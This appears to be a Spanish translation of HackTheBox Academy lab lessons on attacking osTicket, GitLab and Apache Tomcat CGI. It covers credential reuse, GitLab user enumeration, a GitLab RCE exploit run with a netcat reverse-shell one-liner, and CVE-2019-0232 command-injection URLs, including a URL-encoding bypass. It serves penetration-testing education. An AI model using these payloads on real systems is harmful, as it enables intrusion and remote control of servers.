![](https://academy.hackthebox.com/storage/modules/113/new_ticket.png)

Esta es una versión modificada de osTicket como ejemplo, pero podemos ver que se proporcionó una dirección de correo electrónico.

   

![](https://academy.hackthebox.com/storage/modules/113/ticket_email.png)

Ahora, si iniciamos sesión, podemos ver información sobre el ticket y formas de publicar una respuesta. Si la compañía configuró su software de servicio de asistencia para correlacionar los números de tickets con los correos electrónicos, entonces cualquier correo electrónico enviado al correo electrónico que recibimos al registrarse `940288@inlanefreight.local`, aparecería aquí. Con esta configuración, si podemos encontrar un portal externo como un Wiki, un servicio de chat (Slack, Mattermost, Rocket.chat) o un repositorio de Git como GitLab o Bitbucket, podemos usar este correo electrónico para registrar una cuenta y el portal de soporte de la mesa de ayuda para recibir un correo electrónico de confirmación de registro.

   

![](https://academy.hackthebox.com/storage/modules/113/ost_tickets.png)

---

## osTicket - Exposición Sensible a Datos

Digamos que estamos en una prueba de penetración externa. Durante nuestro OSINT y la recopilación de información, descubrimos varias credenciales de usuario utilizando la herramienta [Deshacer](http://dehashed.com/) (para nuestros propósitos, los datos de muestra a continuación son ficticios).

  osTicket

```shell-session
vcrdcr@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : julie.clayton@inlanefreight.local
username : jclayton
password : JulieC8765!
hashed_password : 
name : Julie Clayton
vin : 
address : 
phone : 
database_name : ModBSolutions


id : 7344467234
email : kevin@inlanefreight.local
username : kgrimes
password : Fish1ng_s3ason!
hashed_password : 
name : Kevin Grimes
vin : 
address : 
phone : 
database_name : MyFitnessPal

<SNIP>
```

Este volcado muestra contraseñas en texto claro para dos usuarios diferentes: `jclayton` y `kgrimes`. En este punto, también hemos realizado una enumeración de subdominios y nos encontramos con varios interesantes.

  osTicket

```shell-session
vcrdcr@htb[/htb]$ cat ilfreight_subdomains

vpn.inlanefreight.local
support.inlanefreight.local
ns1.inlanefreight.local
mail.inlanefreight.local
apps.inlanefreight.local
ftp.inlanefreight.local
dev.inlanefreight.local
ir.inlanefreight.local
auth.inlanefreight.local
careers.inlanefreight.local
portal-stage.inlanefreight.local
dns1.inlanefreight.local
dns2.inlanefreight.local
meet.inlanefreight.local
portal-test.inlanefreight.local
home.inlanefreight.local
legacy.inlanefreight.local
```

Navegamos a cada subdominio y encontramos que muchos están desaparecidos, pero el `support.inlanefreight.local` y `vpn.inlanefreight.local` son activos y muy prometedores. `Support.inlanefreight.local` está alojando una instancia de osTicket, y `vpn.inlanefreight.local` es un portal web Barracuda SSL VPN que no parece estar utilizando la autenticación multifactor.

   

![](https://academy.hackthebox.com/storage/modules/113/osticket_admin.png)

Probemos las credenciales para `jclayton`. Sin suerte. Luego probamos las credenciales para `kgrimes` y no tenga éxito, pero al notar que la página de inicio de sesión también acepta una dirección de correo electrónico, lo intentamos `kevin@inlanefreight.local` ¡y obtenga un inicio de sesión exitoso!

   

![](https://academy.hackthebox.com/storage/modules/113/osticket_kevin.png)

El usuario `kevin` parece ser un agente de soporte, pero no tiene tickets abiertos. ¿Quizás ya no están activos? En una empresa ocupada, esperaríamos ver algunos boletos abiertos. Excavando un poco, encontramos un boleto cerrado, una conversación entre un empleado remoto y el agente de soporte.

   

![](https://academy.hackthebox.com/storage/modules/113/osticket_ticket.png)

El empleado afirma que fueron bloqueados de su cuenta VPN y le pide al agente que la restablezca. Luego, el agente le dice al usuario que la contraseña se restableció a la nueva contraseña estándar de unión. El usuario no tiene esta contraseña y le pide al agente que los llame para proporcionarles la contraseña (¡sólida conciencia de seguridad!). Luego, el agente comete un error y envía la contraseña al usuario directamente a través del portal. A partir de aquí, podríamos probar esta contraseña contra el portal VPN expuesto, ya que es posible que el usuario no la haya cambiado.

Además, el agente de soporte afirma que esta es la contraseña estándar dada a los nuevos usuarios y establece la contraseña del usuario en este valor. Hemos estado en muchas organizaciones donde el servicio de asistencia utiliza una contraseña estándar para nuevos usuarios y restablecimientos de contraseñas. A menudo, la política de contraseña de dominio es laxa y no obliga al usuario a cambiar en el siguiente inicio de sesión. Si este es el caso, puede funcionar para otros usuarios. Aunque fuera del alcance de este módulo, en este escenario, valdría la pena usar herramientas como [linkedin2usnombre](https://github.com/initstring/linkedin2username) para crear una lista de usuarios de los empleados de la empresa e intentar un ataque de pulverización de contraseñas contra el punto final de VPN con esta contraseña estándar.

Muchas aplicaciones como osTicket también contienen una libreta de direcciones. También valdría la pena exportar todos los correos electrónicos/nombres de usuario de la libreta de direcciones como parte de nuestra enumeración, ya que también podrían ser útiles en un ataque como la pulverización de contraseñas.

---

## Pensamientos Cerradores

Aunque esta sección mostró algunos escenarios ficticios, se basan en cosas que es probable que veamos en el mundo real. Cuando nos encontramos con portales de soporte (especialmente externos), debemos probar la funcionalidad y ver si podemos hacer cosas como crear un ticket y tener una dirección de correo electrónico legítima de la empresa asignada a nosotros. A partir de ahí, es posible que podamos usar la dirección de correo electrónico para iniciar sesión en otros servicios de la empresa y obtener acceso a datos confidenciales.

Esta sección también muestra los peligros de la reutilización de contraseñas y los tipos de datos que es muy probable que encontremos si podemos obtener acceso a la cola de tickets de soporte de un agente de la mesa de ayuda. Las organizaciones pueden prevenir este tipo de fuga de información tomando algunos pasos relativamente fáciles:

- Limite qué aplicaciones están expuestas externamente
- Hacer cumplir la autenticación multifactor en todos los portales externos
- Brindar capacitación en conciencia de seguridad a todos los empleados y aconsejarles que no usen sus correos electrónicos corporativos para inscribirse en servicios de terceros
- Hacer cumplir una política de contraseña segura en Active Directory y en todas las aplicaciones, sin permitir palabras comunes como variaciones de `welcome`, y `password`, el nombre de la empresa, y las estaciones y meses
- Requerir que un usuario cambie su contraseña después de su inicio de sesión inicial y caduque periódicamente las contraseñas del usuario


# Gitlab - Descubrimiento y enumeración

---

[GitLab](https://about.gitlab.com/) es una herramienta de alojamiento de repositorio Git basada en la web que proporciona capacidades wiki, seguimiento de problemas y funcionalidad continua de integración e implementación de tuberías. Es de código abierto y originalmente escrito en Ruby, pero la pila de tecnología actual incluye Go, Ruby on Rails y Vue.js. Gitlab se lanzó por primera vez en 2014 y, a lo largo de los años, se ha convertido en una empresa de 1.400 personas con $150 millones de ingresos en 2020. Aunque la aplicación es gratuita y de código abierto, también ofrecen una versión empresarial de pago. Aquí hay algunos rápidos [estadísticas](https://about.gitlab.com/company/) acerca de GitLab:

- Al momento de escribir este artículo, la compañía tiene 1,466 empleados
- Gitlab tiene más de 30 millones de usuarios registrados ubicados en 66 países
- La compañía publica la mayoría de sus procedimientos internos y OKR públicamente en su sitio web
- Algunas compañías que usan GitLab incluyen Drupal, Goldman Sachs, Hackerone, Ticketmaster, Nvidia, Siemens y [más](https://about.gitlab.com/customers/)

GitLab es similar a GitHub y BitBucket, que también son herramientas de repositorio Git basadas en la web. Se puede ver una comparación entre los tres [aquí](https://stackshare.io/stackups/bitbucket-vs-github-vs-gitlab).

Durante las pruebas de penetración internas y externas, es común encontrar datos interesantes en el repositorio de GitHub de una empresa o en una instancia de GitLab o BitBucket autohospedada. Estos repositorios de Git pueden contener código disponible públicamente, como scripts, para interactuar con una API. Sin embargo, también podemos encontrar scripts o archivos de configuración que se cometieron accidentalmente que contienen secretos en texto claro, como contraseñas que podemos usar para nuestro beneficio. También podemos encontrar claves privadas SSH. Podemos intentar utilizar la función de búsqueda para buscar usuarios, contraseñas, etc. Aplicaciones como GitLab permiten repositorios públicos (que no requieren autenticación), repositorios internos (disponibles para usuarios autenticados) y repositorios privados (restringidos a usuarios específicos). También vale la pena examinar cualquier repositorio público para datos confidenciales ysi la aplicación lo permite, registre una cuenta y mire para ver si hay repositorios internos interesantes accesibles. La mayoría de las empresas solo permitirán que un usuario con una dirección de correo electrónico de la empresa se registre y requerirá que un administrador autorice la cuenta, pero como veremos más adelante, se puede configurar una instancia de GitLab para permitir que cualquiera se registre y luego inicie sesión.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_signup_res.png)

Si podemos obtener credenciales de usuario de nuestro OSINT, es posible que podamos iniciar sesión en una instancia de GitLab. La autenticación de dos factores está deshabilitada de forma predeterminada.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_2fa.png)

---

## Huella y Descubrimiento

Podemos determinar rápidamente que GitLab está en uso en un entorno simplemente navegando a la URL de GitLab, y se nos dirigirá a la página de inicio de sesión, que muestra el logotipo de GitLab.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_login.png)

La única forma de establecer el número de versión de GitLab en uso es navegando hacia el `/help` página cuando inició sesión. Si la instancia de GitLab nos permite registrar una cuenta, podemos iniciar sesión y navegar a esta página para confirmar la versión. Si no podemos registrar una cuenta, es posible que tengamos que probar un exploit de bajo riesgo, como [esto](https://www.exploit-db.com/exploits/49821). No recomendamos lanzar varios exploits en una aplicación, por lo que si no tenemos forma de enumerar el número de versión (como una fecha en la página, el primer commit público o al registrar un usuario), entonces debemos seguir buscando secretos y no probar múltiples exploits contra él a ciegas. Ha habido algunas hazañas serias contra GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) y GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) en los últimos años, así como GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), y [13.10.2](https://www.exploit-db.com/exploits/49951).

---

## Enumeración

No hay mucho que podamos hacer contra GitLab sin saber el número de versión o haber iniciado sesión. Lo primero que debemos intentar es navegar `/explore` y ver si hay algún proyecto público que pueda contener algo interesante. Navegando a esta página, vemos un proyecto llamado `Inlanefreight dev`. Los proyectos públicos pueden ser interesantes porque podemos usarlos para obtener más información sobre la infraestructura de la empresa, encontrar código de producción en el que podamos encontrar un error después de una revisión de código, credenciales codificadas, un script o archivo de configuración que contenga credenciales u otros secretos como una clave privada SSH o una clave API.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_explore.png)

Navegando al proyecto, parece un proyecto de ejemplo y puede no contener nada útil, aunque siempre vale la pena explorar.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_example.png)

Desde aquí, podemos explorar cada una de las páginas enlazadas en la parte superior izquierda `groups`, `snippets`, y `help`. También podemos usar la funcionalidad de búsqueda y ver si podemos descubrir otros proyectos. Una vez que hayamos terminado de investigar lo que está disponible externamente, debemos verificar y ver si podemos registrar una cuenta y acceder a proyectos adicionales. Supongamos que la organización no configuró GitLab solo para permitir que los correos electrónicos de la empresa se registren o para requerir que un administrador apruebe una nueva cuenta. En ese caso, es posible que podamos acceder a datos adicionales.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_signup.png)

También podemos usar el formulario de registro para enumerar usuarios válidos (más sobre esto en la siguiente sección). Si podemos hacer una lista de usuarios válidos, podríamos intentar adivinar contraseñas débiles o posiblemente reutilizar las credenciales que encontramos de un volcado de contraseña utilizando una herramienta como `Dehashed` como se ve en la sección osTicket. Aquí podemos ver al usuario `root` se toma. Veremos otro ejemplo de enumeración de nombre de usuario en la siguiente sección. En este caso particular de GitLab (y probablemente otros), también podemos enumerar correos electrónicos. Si intentamos registrarnos con un correo electrónico que ya se ha tomado, obtendremos el error `1 error prohibited this user from being saved: Email has already been taken`. A partir del momento de escribir, esta técnica de enumeración de nombre de usuario funciona con la última versión de GitLab. Incluso si el `Sign-up enabled` la casilla de verificación se borra en la página de configuración en `Sign-up restrictions`, todavía podemos navegar hacia el `/users/sign_up`página y enumerar usuarios pero no podrá registrar un usuario.

Se pueden implementar algunas mitigaciones para esto, como hacer cumplir 2FA en todas las cuentas de usuario, utilizando `Fail2Ban` para bloquear los intentos fallidos de inicio de sesión que son indicativos de ataques de fuerza bruta, e incluso restringir qué direcciones IP pueden acceder a una instancia de GitLab si debe ser accesible fuera de la red corporativa interna.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_taken2.png)

Sigamos adelante y regístrese con las credenciales `hacker:Welcome` y entra y mira alrededor. Tan pronto como completamos el registro, iniciamos sesión y nos llevamos a la página del panel de proyectos. Si vamos al `/explore` página ahora, notamos que ahora hay un proyecto interno `Inlanefreight website` disponible para nosotros. Excavando un poco, esto parece ser un sitio web estático para la empresa. Supongamos que se trataba de algún otro tipo de aplicación (como PHP). En ese caso, podríamos descargar la fuente y revisarla en busca de vulnerabilidades u funcionalidad oculta o encontrar credenciales u otros datos confidenciales.

   

![](https://academy.hackthebox.com/storage/modules/113/gitlab_internal.png)

En un escenario del mundo real, es posible que podamos encontrar una cantidad considerable de datos confidenciales si podemos registrarnos y obtener acceso a cualquiera de sus repositorios. Como esto [entrada de blog](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explica, hay una cantidad considerable de datos que podemos descubrir en GitLab, GitHub, etc.

---

## Hacia adelante

Esta sección nos muestra la importancia (y el poder) de la enumeración y que no todas las aplicaciones que descubrimos tienen que ser explotables directamente para demostrarnos muy interesantes y útiles durante un compromiso. Esto es especialmente cierto en las pruebas de penetración externas donde la superficie de ataque suele ser considerablemente más pequeña que una evaluación interna. Es posible que necesitemos recopilar datos de dos o más fuentes para montar un ataque exitoso.



# Atacar a GitLab

---

Como vimos en la sección anterior, incluso el acceso no autenticado a una instancia de GitLab podría llevar a un compromiso de datos confidenciales. Si pudiéramos obtener acceso como un usuario válido de la empresa o un administrador, podríamos descubrir suficientes datos para comprometer completamente la organización de alguna manera. GitLab tiene [553 CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) reportado a septiembre de 2021. Si bien no todos son explotables, ha habido varios graves a lo largo de los años que podrían conducir a la ejecución remota de código.

---

## Nombre de usuario Enumeración

Aunque no se considera una vulnerabilidad por GitLab como se ve en su [Hackerone](https://hackerone.com/gitlab?type=team) page ("Enumeración de usuarios y proyectos/divulgación de rutas a menos que se pueda demostrar un impacto adicional"), sigue siendo algo que vale la pena verificar, ya que podría resultar en acceso si los usuarios seleccionan contraseñas débiles. Podemos hacer esto manualmente, por supuesto, pero los scripts hacen que nuestro trabajo sea mucho más rápido. Podemos escribir uno nosotros mismos en Bash o Python o usar [este](https://www.exploit-db.com/exploits/49821) para enumerar una lista de usuarios válidos. Se puede encontrar la versión Python3 de esta misma herramienta [aquí](https://github.com/dpgg101/GitLabUserEnum). Al igual que con cualquier tipo de ataque de pulverización de contraseñas, debemos tener en cuenta el bloqueo de la cuenta y otros tipos de interrupciones. Los valores predeterminados de GitLab se establecen en 10 intentos fallidos que resultan en un desbloqueo automático después de 10 minutos. Esto se puede ver [aquí](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb). Esto se puede cambiar, pero GitLab tendría que ser compilado por fuente. En este momento, no hay forma de cambiar esta configuración de la interfaz de usuario de administrador, pero un administrador puede modificar la longitud mínima de la contraseña, lo que podría ayudar a los usuarios a elegir contraseñas cortas y comunes, pero no mitigará por completo el riesgo de ataques de contraseña.

  Atacar a GitLab

```shell-session
# Number of authentication tries before locking an account if lock_strategy
# is failed attempts.
config.maximum_attempts = 10

# Time interval to unlock the account if :time is enabled as unlock_strategy.
config.unlock_in = 10.minutes
```

Al descargar el script y ejecutarlo contra la instancia de GitLab de destino, vemos que hay dos nombres de usuario válidos `root` (la cuenta de administrador incorporada) y `bob`. Si eliminamos con éxito una gran lista de usuarios, podríamos intentar un ataque controlado de pulverización de contraseñas con contraseñas débiles y comunes, como `Welcome1` o `Password123`, etc., o intente reutilizar las credenciales recopiladas de otras fuentes, como los volcados de contraseñas de violaciones de datos públicos.

  Atacar a GitLab

```shell-session
vcrdcr@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

---

## Ejecución Remota de Código Autenticada

Las vulnerabilidades de ejecución remota de código generalmente se consideran la "crema del recorte", ya que el acceso al servidor subyacente probablemente nos otorgará acceso a todos los datos que residen en él (aunque es posible que primero tengamos que escalar los privilegios) y puede servir como punto de apoyo en la red para lanzar nuevos ataques contra otros sistemas y potencialmente resultar en un compromiso total de la red. GitLab Community Edition versión 13.10.2 e inferior sufría de una ejecución remota de código autenticada [vulnerabilidad](https://hackerone.com/reports/1154542) debido a un problema con ExifTool que maneja metadatos en archivos de imagen cargados. GitLab solucionó este problema con bastante rapidez, pero es probable que algunas empresas sigan utilizando una versión vulnerable. Podemos usar esto [explotar](https://www.exploit-db.com/exploits/49951) para lograr RCE.

Como se trata de la ejecución remota de código autenticada, primero necesitamos un nombre de usuario y una contraseña válidos. En algunos casos, esto solo funcionaría si pudiéramos obtener credenciales válidas a través de OSINT o un ataque de adivinación de credenciales. Sin embargo, si nos encontramos con una versión vulnerable de GitLab que permite el auto-registro, podemos registrarnos rápidamente para una cuenta y llevar a cabo el ataque.

  Atacar a GitLab

```shell-session
vcrdcr@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Y obtenemos un caparazón casi al instante.

  Atacar a GitLab

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```



# Atacar a Tomcat CGI

---

`CVE-2019-0232` es un problema de seguridad crítico que podría resultar en la ejecución remota de código. Esta vulnerabilidad afecta a los sistemas Windows que tienen el `enableCmdLineArguments` característica habilitada. Un atacante puede explotar esta vulnerabilidad explotando una falla de inyección de comandos resultante de un error de validación de entrada Tomcat CGI Servlet, lo que les permite ejecutar comandos arbitrarios en el sistema afectado. Versiones `9.0.0.M1` a `9.0.17`, `8.5.0` a `8.5.39`, y `7.0.0` a `7.0.93` de Tomcat se ven afectados.

El Servlet CGI es un componente vital de Apache Tomcat que permite a los servidores web comunicarse con aplicaciones externas más allá del JVM de Tomcat. Estas aplicaciones externas son típicamente scripts CGI escritos en lenguajes como Perl, Python o Bash. El Servlet CGI recibe solicitudes de navegadores web y las reenvía a scripts CGI para su procesamiento.

En esencia, un Servlet CGI es un programa que se ejecuta en un servidor web, como Apache2, para admitir la ejecución de aplicaciones externas que se ajustan a la especificación CGI. Es un middleware entre servidores web y recursos de información externos como bases de datos.

Los scripts CGI se utilizan en sitios web por varias razones, pero también hay algunas desventajas bastante grandes al usarlos:

|**Ventajas**|**Desventajas**|
|---|---|
|Es simple y eficaz para generar contenido web dinámico.|Invierte gastos generales al tener que cargar programas en la memoria para cada solicitud.|
|Use cualquier lenguaje de programación que pueda leer desde la entrada estándar y escribir en la salida estándar.|No se pueden almacenar fácilmente datos en caché en la memoria entre las solicitudes de página.|
|Puede reutilizar el código existente y evitar escribir código nuevo.|Reduce el rendimiento del servidor y consume mucho tiempo de procesamiento.|

El `enableCmdLineArguments` la configuración del Servlet CGI de Apache Tomcat controla si se crean argumentos de línea de comandos a partir de la cadena de consulta. Si se establece en true, el Servlet CGI analiza la cadena de consulta y la pasa al script CGI como argumentos. Esta característica puede hacer que los scripts CGI sean más flexibles y fáciles de escribir al permitir que los parámetros se pasen al script sin usar variables de entorno o entrada estándar. Por ejemplo, un script CGI puede usar argumentos de línea de comandos para cambiar entre acciones según la entrada del usuario.

Supongamos que tiene un script CGI que permite a los usuarios buscar libros en el catálogo de una librería. El guión tiene dos acciones posibles: "búsqueda por título" y "búsqueda por autor."

El script CGI puede usar argumentos de línea de comandos para cambiar entre estas acciones. Por ejemplo, el script se puede llamar con la siguiente URL:

Código: http

```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Aquí, el `action` el parámetro se establece en `title`, indicando que el script debe buscar por título del libro. El `query` el parámetro especifica el término de búsqueda "el gran gatsby."

Si el usuario desea buscar por autor, puede usar una URL similar:

Código: http

```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

Aquí, el `action` el parámetro se establece en `author`, indicando que el script debe buscar por nombre de autor. El `query` el parámetro especifica el término de búsqueda "fitzgerald."

Mediante el uso de argumentos de línea de comandos, el script CGI puede cambiar fácilmente entre diferentes acciones de búsqueda basadas en la entrada del usuario. Esto hace que el script sea más flexible y fácil de usar.

Sin embargo, surge un problema cuando `enableCmdLineArguments` está habilitado en sistemas Windows porque el Servlet CGI no valida correctamente la entrada del navegador web antes de pasarla al script CGI. Esto puede conducir a un ataque de inyección de comandos del sistema operativo, que permite a un atacante ejecutar comandos arbitrarios en el sistema de destino inyectándolos en otro comando.

Por ejemplo, un atacante puede agregar `dir` a un comando válido usando `&` como separador para ejecutar `dir` en un sistema Windows. Si el atacante controla la entrada a un script CGI que utiliza este comando, puede inyectar sus propios comandos después `&` para ejecutar cualquier comando en el servidor. Un ejemplo de esto es `http://example.com/cgi-bin/hello.bat?&dir`, que pasa `&dir` como argumento para `hello.bat` y ejecuta `dir` en el servidor. Como resultado, un atacante puede explotar el error de validación de entrada del Servlet CGI para ejecutar cualquier comando en el servidor.

---

## Enumeración

Escanea el objetivo usando `nmap`esto ayudará a identificar los servicios activos que operan actualmente en el sistema. Este proceso proporcionará información valiosa sobre el objetivo, descubriendo qué servicios y potencialmente qué versiones específicas se están ejecutando, lo que permitirá una mejor comprensión de su infraestructura y posibles vulnerabilidades.

#### Nmap - Puertos Abiertos

  Atacar a Tomcat CGI

```shell-session
vcrdcr@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```

Aquí podemos ver que Nmap ha identificado `Apache Tomcat/9.0.17` corriendo en puerto `8080`.

#### Encontrar un script CGI

Una forma de descubrir el contenido del servidor web es utilizando el `ffuf` herramienta de enumeración web junto con el `dirb common.txt` lista de palabras. Sabiendo que el directorio predeterminado para los scripts CGI es `/cgi`, ya sea a través del conocimiento previo o investigando la vulnerabilidad, podemos usar la URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` o `http://10.129.204.227:8080/cgi/FUZZ.bat` para realizar fuzzing.

#### Fuzzing Extentions - .CMD

  Attacking Tomcat CGI

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```

Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.

#### Fuzzing Extentions - .BAT

  Attacking Tomcat CGI

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

Code: txt

```txt
Welcome to CGI, this section is not functional yet. Please return to home page.
```

---

## Exploitation

As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

Code: http

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

Navegar a la URL anterior devuelve la salida para el `dir` comando por lotes, sin embargo, tratando de ejecutar otras aplicaciones comunes de línea de comandos de Windows, como `whoami` no devuelve una salida.

Recupere una lista de variables ambientales llamando al `set` comando:

Código: http

```http
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

De la lista, podemos ver que el `PATH` la variable ha sido inestable, por lo que necesitaremos rutas de código duro en solicitudes:

Código: http

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

El intento no tuvo éxito, y Tomcat respondió con un mensaje de error que indicaba que se había encontrado un personaje no válido. Apache Tomcat introdujo un parche que utiliza una expresión regular para evitar el uso de caracteres especiales. Sin embargo, el filtro se puede omitir codificando la URL de la carga útil.

Código: http

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```


# Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

---

